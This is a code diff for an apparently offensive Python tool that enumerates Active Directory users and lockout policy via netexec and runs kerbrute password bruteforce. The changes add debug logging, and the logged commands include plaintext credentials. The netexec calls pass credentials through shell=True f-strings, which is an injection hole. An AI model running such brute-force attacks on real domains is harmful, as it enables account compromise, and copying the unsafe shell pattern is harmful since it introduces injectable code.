@@ -26,7 +26,7 @@ logger.remove()  # Remove default handler
 logger.add(
     sys.stderr,
     format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>",
-    level="INFO",
+    level="WARNING",  # Default: only show warnings and errors
     colorize=True,
     backtrace=True,
     diagnose=True,
@@ -64,9 +64,9 @@ def sync_time_with_pdc(pdc_ip: str) -> bool:
 
     # Enable NTP synchronization
     try:
-        result = subprocess.run(
-            ["timedatectl", "set-ntp", "true"], capture_output=True, text=True, check=True, timeout=10
-        )
+        cmd_ntp = ["timedatectl", "set-ntp", "true"]
+        logger.debug("Executing: {}", " ".join(cmd_ntp))
+        result = subprocess.run(cmd_ntp, capture_output=True, text=True, check=True, timeout=10)
         logger.debug("NTP enabled successfully")
     except subprocess.CalledProcessError as e:
         logger.warning("Failed to enable NTP: {}. stderr: {}", e, clean_ansi(e.stderr) if e.stderr else "N/A")
@@ -78,7 +78,9 @@ def sync_time_with_pdc(pdc_ip: str) -> bool:
 
     # Synchronize with PDC using ntpdate
     try:
-        result = subprocess.run(["ntpdate", pdc_ip], capture_output=True, text=True, check=True, timeout=30)
+        cmd_ntpdate = ["ntpdate", pdc_ip]
+        logger.debug("Executing: {}", " ".join(cmd_ntpdate))
+        result = subprocess.run(cmd_ntpdate, capture_output=True, text=True, check=True, timeout=30)
         logger.info("[+] Successfully synchronized time with PDC")
         if result.stdout:
             logger.debug("ntpdate output: {}", clean_ansi(result.stdout))
@@ -130,6 +132,7 @@ def get_netexec_users(dc_ip: str, username: str, password: str, domain: str) -> 
         "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
     )
     try:
+        logger.debug("Executing netexec command: {}", cmd)
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True, timeout=300)
     except subprocess.CalledProcessError as e:
         logger.error(
@@ -179,6 +182,7 @@ def get_account_lockout_threshold(dc_ip: str, username: str, password: str, doma
     nxc_cmd = netexec_path if os.path.exists(netexec_path) else "nxc"
     cmd = f"{nxc_cmd} smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --pass-pol"
     try:
+        logger.debug("Executing netexec command: {}", cmd)
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True, timeout=300)
     except subprocess.CalledProcessError as e:
         logger.error(
@@ -445,8 +449,10 @@ def run_smart_kerbrute(domain: str, dc_ip: str, temp_file: str, kerbrute_path: O
 
     cmd = [kerbrute_cmd, "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
     try:
+        logger.debug("Executing kerbrute command: {}", " ".join(cmd))
         result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=3600)
-        logger.info(clean_ansi(result.stdout))
+        # Always show kerbrute output (it's the main result)
+        print(clean_ansi(result.stdout))
     except subprocess.CalledProcessError as e:
         logger.error("Error executing kerbrute: {}", e)
         if e.stdout:
@@ -519,8 +525,10 @@ def run_kerbrute(
     if output_dir:
         cmd.extend(["-o", output_dir])
     try:
+        logger.debug("Executing kerbrute command: {}", " ".join(cmd))
         result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=3600)
-        logger.info(clean_ansi(result.stdout))
+        # Always show kerbrute output (it's the main result)
+        print(clean_ansi(result.stdout))
     except subprocess.CalledProcessError as e:
         logger.error("Error executing kerbrute: {}", e)
         if e.stdout:
